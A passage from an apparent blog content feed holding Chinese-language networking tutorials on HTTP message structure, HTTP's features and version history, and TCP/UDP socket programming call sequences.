表单数据）。</p><p>主体大致可分为两类：</p><ul><li>单一资源（Single-resource）主体，由一个单文件组成。该类型的主体由两个标头定义：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type"><code>Content-Type</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length"><code>Content-Length</code></a>。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types#multipartform-data">多资源（Multiple-resource）主体</a>，由多部分主体组成，每一部分包含不同的信息位。通常是和 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/Forms">HTML 表单</a>连系在一起。</li></ul><h3 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h3><p><img src="https://static001.geekbang.org/resource/image/6b/63/6bc37ddcb4e7a61ca3275790820f2263.jpeg?wh=1761*937" alt="img"></p><p>HTTP 响应的一个例子：</p><p><img src="https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview/http_response.png" alt="img"></p><p>响应报文包含了下面的元素：</p><ul><li>HTTP 协议版本号。</li><li>一个状态码（<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">状态码（status code）</a>），来告知对应请求执行成功或失败，以及失败的原因。</li><li>一个状态信息，这个信息是非权威的状态码描述信息，可以由服务端自行设定。</li><li>HTTP <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers">标头</a>，与请求标头类似。</li><li>可选项，比起请求报文，响应报文中更常见地包含获取资源的主体。</li></ul><h4 id="状态行"><a href="#状态行" class="headerlink" title="状态行"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Messages#%E7%8A%B6%E6%80%81%E8%A1%8C">状态行</a></h4><p>HTTP 响应的起始行被称作<em>状态行</em>（status line），包含以下信息：</p><ol><li><em>协议版本</em>，通常为 <code>HTTP/1.1</code>。</li><li><em>状态码</em>（status code），表明请求是成功或失败。常见的状态码是 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200"><code>200</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/404"><code>404</code></a> 或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/302"><code>302</code></a>。</li><li><em>状态文本</em>（status text）。一个简短的，纯粹的信息，通过状态码的文本描述，帮助人们理解该 HTTP 消息。</li></ol><p>一个典型的状态行看起来像这样：<code>HTTP/1.1 404 Not Found</code>。</p><h4 id="标头（Header）-1"><a href="#标头（Header）-1" class="headerlink" title="标头（Header）"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Messages#%E6%A0%87%E5%A4%B4%EF%BC%88header%EF%BC%89_2">标头（Header）</a></h4><p>响应的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers">HTTP 标头</a>遵循和任何其它标头相同的结构：不区分大小写的字符串，紧跟着的冒号（<code>&#39;:&#39;</code>）和一个结构取决于标头类型的值。整个标头（包括其值）表现为单行形式。</p><p>许多不同的标头可能会出现在响应中。这些可以分为几组：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/General_header">通用标头（General header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Via"><code>Via</code></a>，适用于整个消息。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Response_header">响应标头（Response header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary"><code>Vary</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Ranges"><code>Accept-Ranges</code></a>，提供有关服务器的其他信息，这些信息不适合状态行。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Representation_header">表示标头（Representation header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type"><code>Content-Type</code></a> 描述了消息数据的原始格式和应用的任意编码（仅在消息有主体时才存在）。</li></ul><p><img src="https://developer.mozilla.org/en-US/docs/Web/HTTP/Messages/http_response_headers3.png" alt="Example of headers in an HTTP response"></p><h4 id="主体（Body）-1"><a href="#主体（Body）-1" class="headerlink" title="主体（Body）"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Messages#%E4%B8%BB%E4%BD%93%EF%BC%88body%EF%BC%89_2">主体（Body）</a></h4><p>响应的最后一部分是主体。不是所有的响应都有主体：具有状态码（如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/201"><code>201</code></a> 或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/204"><code>204</code></a>）的响应，通常不会有主体。</p><p>主体大致可分为三类：</p><ul><li>单资源（Single-resource）主体，由<strong>已知</strong>长度的单个文件组成。该类型主体由两个标头定义：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type"><code>Content-Type</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length"><code>Content-Length</code></a>。</li><li>单资源（Single-resource）主体，由<strong>未知</strong>长度的单个文件组成。通过将 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding"><code>Transfer-Encoding</code></a> 设置为 <code>chunked</code> 来使用分块编码。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types#multipartform-data">多资源（Multiple-resource）主体</a>，由多部分 body 组成，每部分包含不同的信息段。但这是比较少见的。</li></ul><h2 id="HTTP-x2F-2-帧"><a href="#HTTP-x2F-2-帧" class="headerlink" title="HTTP&#x2F;2 帧"></a>HTTP&#x2F;2 帧</h2><p>HTTP&#x2F;1.x 消息有一些性能上的缺点：</p><ul><li>与主体不同，标头不会被压缩。</li><li>两个消息之间的标头通常非常相似，但它们仍然在连接中重复传输。</li><li>无法多路复用。当在同一个服务器打开几个连接时：TCP 热连接比冷连接更加有效。</li></ul><p>HTTP&#x2F;2 引入了一个额外的步骤：它将 HTTP&#x2F;1.x 消息分成帧并嵌入到流（stream）中。数据帧和报头帧分离，这将允许报头压缩。将多个流组合，这是一个被称为<em>多路复用</em>（multiplexing）的过程，它允许更有效的底层 TCP 连接。</p><p><img src="https://developer.mozilla.org/en-US/docs/Web/HTTP/Messages/binary_framing2.png" alt="HTTP/2 modify the HTTP message to divide them in frames (part of a single stream), allowing for more optimization."></p><p>HTTP 帧现在对 Web 开发人员是透明的。在 HTTP&#x2F;2 中，这是一个在 HTTP&#x2F;1.1 和底层传输协议之间附加的步骤。Web 开发人员不需要在其使用的 API 中做任何更改来利用 HTTP 帧；当浏览器和服务器都可用时，HTTP&#x2F;2 将被打开并使用。</p><h2 id="QUIC-协议"><a href="#QUIC-协议" class="headerlink" title="QUIC 协议"></a>QUIC 协议</h2><p>QUIC 协议通过基于 UDP 自定义的类似 TCP 的连接、重试、多路复用、流量控制技术，进一步提升性能。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1.维基百科，<a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">https://zh.wikipedia.org/wiki/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE</a></p><p>2.web开发技术，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Session">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Session</a></p><p>3.趣谈网络协议，<a href="https://time.geekbang.org/column/article/9410">https://time.geekbang.org/column/article/9410</a></p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应用层协议：HTTP协议（上）——概述、主要特点、发展</title>
    <link href="/2023/01/15/%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9AHTTP%E5%8D%8F%E8%AE%AE%EF%BC%88%E4%B8%8A%EF%BC%89%E2%80%94%E2%80%94%E6%A6%82%E8%BF%B0%E3%80%81%E4%B8%BB%E8%A6%81%E7%89%B9%E7%82%B9%E3%80%81%E5%8F%91%E5%B1%95/"/>
    <url>/2023/01/15/%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9AHTTP%E5%8D%8F%E8%AE%AE%EF%BC%88%E4%B8%8A%EF%BC%89%E2%80%94%E2%80%94%E6%A6%82%E8%BF%B0%E3%80%81%E4%B8%BB%E8%A6%81%E7%89%B9%E7%82%B9%E3%80%81%E5%8F%91%E5%B1%95/</url>
    
    <content type="html"><![CDATA[<h1 id="应用层协议：HTTP协议（上）——概述、主要特点、发展"><a href="#应用层协议：HTTP协议（上）——概述、主要特点、发展" class="headerlink" title="应用层协议：HTTP协议（上）——概述、主要特点、发展"></a>应用层协议：HTTP协议（上）——概述、主要特点、发展</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>HTTP是一个客户端（用户）和服务端（网站）之间请求和应答的标准，通常使用<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">TCP协议</a>，在 Web 上进行数据交换的基础，是一种 client-server 协议。通过使用<a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E9%A0%81%E7%80%8F%E8%A6%BD%E5%99%A8">网页浏览器</a>、<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB">网络爬虫</a>或者其它的工具，客户端发起一个HTTP请求到服务器上指定端口（默认<a href="https://zh.wikipedia.org/wiki/%E9%80%9A%E8%A8%8A%E5%9F%A0">端口</a>为80）。我们称这个客户端为用户代理程序（user agent）。应答的服务器上存储着一些资源，比如HTML文件和图像。我们称这个应答服务器为源服务器（origin server）。在用户代理和源服务器中间可能存在多个“中间层”，比如<a href="https://zh.wikipedia.org/wiki/%E4%BB%A3%E7%90%86%E4%BC%BA%E6%9C%8D%E5%99%A8">代理服务器</a>、<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E5%85%B3">网关</a>或者<a href="https://zh.wikipedia.org/wiki/%E9%9A%A7%E9%81%93">隧道</a>（tunnel）。</p><p>HTTP 是一个拓展性非常好的协议。它依赖于资源或统一资源定位符（URI）的概念、一个简单的消息结构和一个客户端——服务器结构的通信流。在这些基础概念之上，近年来已经出现了许多拓展，以增加新的 HTTP 方法或首部的方式为 HTTP 协议增加了新的功能和语义。</p><h2 id="主要特点"><a href="#主要特点" class="headerlink" title="主要特点"></a>主要特点</h2><ul><li><strong>简单快速</strong>：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。虽然下一代 HTTP&#x2F;2 协议将 HTTP 消息封装到了帧（frame）中，HTTP 大体上还是被设计得简单易读。HTTP 报文能够被人读懂，还允许简单测试，降低了门槛，对新人很友好。</li><li><strong>可扩展的</strong>：在 HTTP&#x2F;1.0 中出现的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers">HTTP 标头（header）</a>让协议扩展变得非常容易。只要服务端和客户端就新标头达成语义一致，新功能就可以被轻松加入进来。</li><li><strong>无连接、有会话的</strong>：HTTP 是无状态的：在同一个连接中，两个执行成功的请求之间是没有关系的。这就带来了一个问题，用户没有办法在同一个网站中进行连续的交互，比如在一个电商网站里，用户把某个商品加入到购物车，切换一个页面后再次添加了商品，这两次添加商品的请求之间没有关联，浏览器无法知道用户最终选择了哪些商品。而使用 HTTP 的标头扩展，HTTP Cookie 就可以解决这个问题。把 Cookie 添加到标头中，创建一个会话让每次请求都能共享相同的上下文信息，达成相同的状态。</li><li><strong>灵活</strong>：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。</li></ul><h2 id="发展过程"><a href="#发展过程" class="headerlink" title="发展过程"></a>发展过程</h2><p>超文本传输协议已经演化出了很多版本，它们中的大部分都是<a href="https://zh.wikipedia.org/wiki/%E5%90%91%E4%B8%8B%E5%85%BC%E5%AE%B9">向下兼容</a>的。在<a href="https://tools.ietf.org/html/rfc2145">RFC 2145</a>中描述了HTTP版本号的用法。<strong>客户端在请求的开始告诉服务器它采用的协议版本号，而后者则在响应中采用相同或者更早的协议版本。</strong></p><h3 id="HTTP-x2F-0-9-–-单行协议"><a href="#HTTP-x2F-0-9-–-单行协议" class="headerlink" title="HTTP&#x2F;0.9 – 单行协议"></a>HTTP&#x2F;0.9 – 单行协议</h3><p>已过时。只接受GET一种请求方法，请求由单行指令构成，以唯一可用方法 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET"><code>GET</code></a> 开头，其后跟目标资源的路径（一旦连接到服务器，协议、服务器、端口号这些都不是必须的）没有在通讯中指定版本号，且不支持请求头。由于该版本不支持POST方法，因此客户端无法向服务器传递太多信息。</p><h3 id="HTTP-x2F-1-0-–-构建可扩展性"><a href="#HTTP-x2F-1-0-–-构建可扩展性" class="headerlink" title="HTTP&#x2F;1.0 – 构建可扩展性"></a>HTTP&#x2F;1.0 – 构建可扩展性</h3><p>这是第一个在通讯中指定版本号的HTTP协议版本。主要改进以及特点如下：</p><ul><li>协议版本信息现在会随着每个请求发送（<code>HTTP/1.0</code> 被追加到了 <code>GET</code> 行）。</li><li>状态码会在响应开始时发送，使浏览器能了解请求执行成功或失败，并相应调整行为（如更新或使用本地缓存）。</li><li>引入了 HTTP 标头的概念，无论是对于请求还是响应，允许传输元数据，使协议变得非常灵活，更具扩展性。</li><li>在新 HTTP 标头的帮助下，具备了传输除纯文本 HTML 文件以外其他类型文档的能力（凭借 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type"><code>Content-Type</code></a> 标头）。</li></ul><h3 id="HTTP-x2F-1-1-–-标准化的协议"><a href="#HTTP-x2F-1-1-–-标准化的协议" class="headerlink" title="HTTP&#x2F;1.1  – 标准化的协议"></a>HTTP&#x2F;1.1  – 标准化的协议</h3><p>默认采用持续连接（Connection: keep-alive），能很好地配合代理服务器工作。还支持以<a href="https://zh.wikipedia.org/wiki/HTTP%E7%AE%A1%E7%BA%BF%E5%8C%96">管道方式</a>在同时发送多个请求，以便降低线路负载，提高传输速度。</p><p>HTTP&#x2F;1.1相较于HTTP&#x2F;1.0协议的区别主要体现在：</p><ul><li>连接可以复用，节省了多次打开 TCP 连接加载网页文档资源的时间。</li><li>增加管线化技术，允许在第一个应答被完全发送之前就发送第二个请求，以降低通信延迟。</li><li>缓存处理，引入额外的缓存控制机制。</li><li>带宽优化及网络连接的使用</li><li>错误通知的管理</li><li>消息在网络中的发送</li><li>引入内容协商机制，包括语言、编码、类型等。</li><li>互联网地址的维护</li><li>安全性及完整性</li></ul><h3 id="HTTP-x2F-2-–-更优异的表现"><a href="#HTTP-x2F-2-–-更优异的表现" class="headerlink" title="HTTP&#x2F;2 – 更优异的表现"></a>HTTP&#x2F;2 – 更优异的表现</h3><p>当前版本，于2015年5月作为互联网标准正式发布。[<a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE#cite_note-5">5]</a></p><p>HTTP&#x2F;2 在 HTTP&#x2F;1.1 有几处基本的不同：</p><ul><li>HTTP&#x2F;2 是二进制协议而不是文本协议。不再可读，也不可无障碍的手动创建，改善的优化技术现在可被实施。</li><li>这是一个多路复用协议。并行的请求能在同一个链接中处理，移除了 HTTP&#x2F;1.x 中顺序和阻塞的约束。</li><li>压缩了标头。因为标头在一系列请求中常常是相似的，其移除了重复和传输重复数据的成本。</li><li>其允许服务器在客户端缓存中填充数据，通过一个叫服务器推送的机制来提前请求。</li></ul><h3 id="HTTP-x2F-3-–-基于QUIC的HTTP"><a href="#HTTP-x2F-3-–-基于QUIC的HTTP" class="headerlink" title="HTTP&#x2F;3 – 基于QUIC的HTTP"></a>HTTP&#x2F;3 – 基于QUIC的HTTP</h3><p>最新版本，于2022年6月6日标准化为RFC9114。传输层抛弃使用TCP，通过UDP上使用QUIC来承载应用层数据。</p><p>截至2023年一月份，主要版本使用比例如下：</p><p><strong>HTTP&#x2F;2 is used by 39.8%</strong> of all the websites.</p><p><strong>HTTP&#x2F;3 is used by 25.0%</strong> of all the websites.</p><p>数据来源于<a href="https://w3techs.com/technologies/details/ce-http2">w3techs</a>，感兴趣的可以自行查看</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1.维基百科，<a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">https://zh.wikipedia.org/wiki/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE</a></p><p>2.web开发技术，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Session">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Session</a></p><p>3.趣谈网络协议，<a href="https://time.geekbang.org/column/article/9410">https://time.geekbang.org/column/article/9410</a></p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>传输层协议：套接字Socket</title>
    <link href="/2023/01/13/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9A%E5%A5%97%E6%8E%A5%E5%AD%97Socket/"/>
    <url>/2023/01/13/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9A%E5%A5%97%E6%8E%A5%E5%AD%97Socket/</url>
    
    <content type="html"><![CDATA[<h1 id="传输层协议：套接字Socket"><a href="#传输层协议：套接字Socket" class="headerlink" title="传输层协议：套接字Socket"></a>传输层协议：套接字Socket</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>socket是一种操作系统提供的进程间通信机制。</p><p>在<a href="https://zh.m.wikipedia.org/wiki/%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1">操作系统</a>中，通常会为应用程序提供一组<a href="https://zh.m.wikipedia.org/wiki/%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E4%BB%8B%E9%9D%A2">应用程序接口</a>（API），称为<strong>套接字接口</strong>（英语：socket API）。应用程序可以通过套接字接口，来使用网络套接字，以进行资料交换。最早的套接字接口来自于4.2 BSD，因此现代常见的套接字接口大多源自<a href="https://zh.m.wikipedia.org/wiki/Berkeley%E5%A5%97%E6%8E%A5%E5%AD%97">Berkeley套接字</a>（Berkeley sockets）标准。在套接字接口中，以<a href="https://zh.m.wikipedia.org/wiki/IP%E5%9C%B0%E5%9D%80">IP地址</a>及<a href="https://zh.m.wikipedia.org/wiki/%E9%80%9A%E8%A8%8A%E5%9F%A0">端口</a>组成<strong>套接字地址</strong>（socket address）。远程的套接字地址，以及本地的套接字地址完成连线后，再加上使用的协议（protocol），这个五元组（five-element tuple），作为<strong>套接字对</strong>（socket pairs），之后就可以彼此交换资料。例如，在同一台计算机上，TCP协议与UDP协议可以同时使用相同的port而互不干扰。 操作系统根据套接字地址，可以决定应该将资料送达特定的<a href="https://zh.m.wikipedia.org/wiki/%E8%A1%8C%E7%A8%8B">行程</a>或<a href="https://zh.m.wikipedia.org/wiki/%E5%9F%B7%E8%A1%8C%E7%B7%92">线程</a>。这就像是<a href="https://zh.m.wikipedia.org/wiki/%E9%9B%BB%E8%A9%B1">电话</a>系统中，以<a href="https://zh.m.wikipedia.org/wiki/%E9%9B%BB%E8%A9%B1%E8%99%9F%E7%A2%BC">电话号码</a>加上分机号码，来决定通话对象一般。</p><p>有下面几种特征：</p><ul><li>本地接口地址，由本地ip地址和（包括TCP，UDP）端口号</li><li>传输协议，例如TCP、UDP、raw IP协议</li></ul><p>一个已经创建连接的接口双方都有整数形式的接口描述符，用来唯一表示该接口。操作系统根据对方接口发过来的IP以及传输协议头信息来提取接口的地址信息，并且将应用数据去除头信息之后提交给相应的应用程序。 在很多网络协议、教科书以及本文中，接口指的是有一个独一无二的接口号的实体。在一些其他的文章[<a href="https://zh.m.wikipedia.org/wiki/Wikipedia:%E5%88%97%E6%98%8E%E6%9D%A5%E6%BA%90">来源请求]</a>当中，接口被叫做本地接口地址，比如”ip和端口的结合”。在一RFC147标准中，这个定义与1971的ARPA网有关，接口指的是一个32位数字，其中偶数的是接收接口，奇数的是发送接口，但是今天通信已经可以实现双向传输，在一个接口中，可以发送的同时还可以接收。</p><p>在类UNIX系统和Windows系统，命令行工具netstat和ss可用以查看当前系统的接口情况。</p><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="数据报套接字（SOCK-DGRAM）——-基于UDP的Socket"><a href="#数据报套接字（SOCK-DGRAM）——-基于UDP的Socket" class="headerlink" title="数据报套接字（SOCK_DGRAM）—— 基于UDP的Socket"></a>数据报套接字（SOCK_DGRAM）—— 基于UDP的Socket</h3><p>数据报套接字是一种无连套接字接字，使用<a href="https://zh.m.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%8D%8F%E8%AE%AE">用户数据报协议</a>（UDP）传输数据。每一个数据包都单独寻址和路由。这导致了接收端接收到的数据可能是乱序的，有一些数据甚至可能会在传输过程中丢失。不过得益于数据报套接字并不需要创建并维护一个稳定的连接，数据报套接字所占用的计算机和系统资源较小。</p><h3 id="流套接字（SOCK-STREAM）——-基于TCP的Socket"><a href="#流套接字（SOCK-STREAM）——-基于TCP的Socket" class="headerlink" title="流套接字（SOCK_STREAM）—— 基于TCP的Socket"></a>流套接字（SOCK_STREAM）—— 基于TCP的Socket</h3><p>连接导向式通信套接字，使用<a href="https://zh.m.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">传输控制协议</a>（TCP）、<a href="https://zh.m.wikipedia.org/wiki/%E6%B5%81%E6%8E%A7%E5%88%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">流控制传输协议</a>（SCTP）或者<a href="https://zh.m.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">数据拥塞控制协议</a>（DCCP）传输数据。流套接字提供可靠并且有序的数据传输服务。在互联网上，流套接字通常使用TCP实现，以便应用可以在任何使用TCP&#x2F;IP协议的网络上运行。</p><h3 id="原始套接字"><a href="#原始套接字" class="headerlink" title="原始套接字"></a>原始套接字</h3><p><a href="https://zh.m.wikipedia.org/wiki/%E5%8E%9F%E5%A7%8B%E5%A5%97%E6%8E%A5%E5%AD%97">原始套接字</a>是一种<a href="https://zh.m.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%A5%97%E6%8E%A5%E5%AD%97">网络套接字</a>。允许直接发送和接受IP数据包并且<strong>不需要任何传输层协议格式</strong>。原始套接字主要用于一些协议的开发，可以进行比较底层的操作。</p><p>原始套接字用于安全相关的应用程序，如<a href="https://zh.m.wikipedia.org/wiki/Nmap">nmap</a>。原始套接字一种可能的用例是在<a href="https://zh.m.wikipedia.org/wiki/%E4%BD%BF%E7%94%A8%E8%80%85%E7%A9%BA%E9%96%93">用户空间</a>实现新的传输层协议。[<a href="https://zh.m.wikipedia.org/zh-cn/%E5%8E%9F%E5%A7%8B%E5%A5%97%E6%8E%A5%E5%AD%97#cite_note-1">1]</a> 原始套接字常在网络设备上用于<a href="https://zh.m.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE">路由协议</a>，例如<a href="https://zh.m.wikipedia.org/wiki/%E5%9B%A0%E7%89%B9%E7%BD%91%E7%BB%84%E7%AE%A1%E7%90%86%E5%8D%8F%E8%AE%AE">IGMP</a>v4、<a href="https://zh.m.wikipedia.org/wiki/%E5%BC%80%E6%94%BE%E5%BC%8F%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E4%BC%98%E5%85%88">开放式最短路径优先</a>协议 (OSPF)、<a href="https://zh.m.wikipedia.org/wiki/%E4%BA%92%E8%81%94%E7%BD%91%E6%8E%A7%E5%88%B6%E6%B6%88%E6%81%AF%E5%8D%8F%E8%AE%AE">互联网控制消息协议</a> (ICMP)。<a href="https://zh.m.wikipedia.org/wiki/Ping">Ping</a>就是发送一个ICMP响应请求包然后接收ICMP响应回复</p><p>相关的性能分析可参考<a href="https://blog.longpi1.com/2022/11/25/UnixDomainSocket%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/">Unix Domain Socket 性能分析</a> </p><h2 id="流套接字（SOCK-STREAM）——-基于TCP的Socket-1"><a href="#流套接字（SOCK-STREAM）——-基于TCP的Socket-1" class="headerlink" title="流套接字（SOCK_STREAM）—— 基于TCP的Socket"></a>流套接字（SOCK_STREAM）—— 基于TCP的Socket</h2><h3 id="TCP-协议的-Socket-程序函数调用过程如下："><a href="#TCP-协议的-Socket-程序函数调用过程如下：" class="headerlink" title="TCP 协议的 Socket 程序函数调用过程如下："></a>TCP 协议的 Socket 程序函数调用过程如下：</h3><ol><li>TCP 的服务端要先监听一个端口，一般是先调用 bind 函数，给这个 Socket 赋予一个 IP 地址和端口。为什么需要端口呢？要知道，你写的是一个应用程序，当一个网络包来的时候，内核要通过 TCP 头里面的这个端口，来找到你这个应用程序，把包给你。为什么要 IP 地址呢？有时候，一台机器会有多个网卡，也就会有多个 IP 地址，你可以选择监听所有的网卡，也可以选择监听一个网卡，这样，只有发给这个网卡的包，才会给你。</li><li>当服务端有了 IP 和端口号，就可以调用 listen 函数进行监听。在 TCP 的状态图里面，有一个 listen 状态，当调用这个函数之后，服务端就进入了这个状态，这个时候客户端就可以发起连接了。</li><li>在内核中，为每个 Socket 维护两个队列。一个是已经建立了连接的队列，这时候连接三次握手已经完毕，处于 established 状态；一个是还没有完全建立连接的队列，这个时候三次握手还没完成，处于 syn_rcvd 的状态。</li><li>接下来，服务端调用 accept 函数，拿出一个已经完成的连接进行处理。如果还没有完成，就要等着。</li><li>在服务端等待的时候，客户端可以通过 connect 函数发起连接。先在参数中指明要连接的 IP 地址和端口号，然后开始发起三次握手。内核会给客户端分配一个临时的端口。一旦握手成功，服务端的 accept 就会返回另一个 Socket。这是需要注意，就是监听的 Socket 和真正用来传数据的 Socket 是两个，一个叫作<strong>监听 Socket</strong>，一个叫作<strong>已连接 Socket</strong>。</li><li>连接建立成功之后，双方开始通过 read 和 write 函数来读写数据，就像往一个文件流里面写东西一样。</li></ol><p>如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/87/ea/87c8ae36ae1b42653565008fc47aceea.jpg?wh=1626*2172" alt="img"></p><h2 id="数据报套接字（SOCK-DGRAM）——-基于UDP的Socket-1"><a href="#数据报套接字（SOCK-DGRAM）——-基于UDP的Socket-1" class="headerlink" title="数据报套接字（SOCK_DGRAM）—— 基于UDP的Socket"></a>数据报套接字（SOCK_DGRAM）—— 基于UDP的Socket</h2><h3 id="基于-UDP-协议的-Socket-程序函数调用过程："><a href="#基于-UDP-协议的-Socket-程序函数调用过程：" class="headerlink" title="基于 UDP 协议的 Socket 程序函数调用过程："></a>基于 UDP 协议的 Socket 程序函数调用过程：</h3><p>对于 UDP 来讲，过程有些不一样。UDP 是没有连接的，所以不需要三次握手，也就不需要调用 listen 和 connect，但是，UDP 的交互仍然需要 IP 和端口号，因而也需要 bind。UDP 是没有维护连接状态的，因而不需要每对连接建立一组 Socket，而是只要有一个 Socket，就能够和多个客户端通信。也正是因为没有连接状态，每次通信的时候，都调用 sendto 和 recvfrom，都可以传入 IP 地址和端口。</p><p>如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/6b/31/6bbe12c264f5e76a81523eb8787f3931.jpg?wh=1245*1261" alt="img"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>1.维基百科，<a href="https://zh.m.wikipedia.org/zh-cn/%E7%B6%B2%E8%B7%AF%E6%8F%92%E5%BA%A7">https://zh.m.wikipedia.org/zh-cn/%E7%B6%B2%E8%B7%AF%E6%8F%92%E5%BA%A7</a></p><p>2.趣谈网络协议，<a href="https://time.geekbang.org/column/article/9293">https://time.geekbang.org/column/article/9293</a></p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>传输层协议：TCP协议（下）——运作方式(如何三次握手、四次挥手等)</title>
    <link href="/2023/01/11/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9ATCP%E5%8D%8F%E8%AE%AE%EF%BC%88%E4%B8%8B%EF%BC%89%E2%80%94%E2%80%94%E8%BF%90%E4%BD%9C%E6%96%B9%E5%BC%8F-%E5%A6%82%E4%BD%95%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E3%80%81%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B%E7%AD%89/"/>
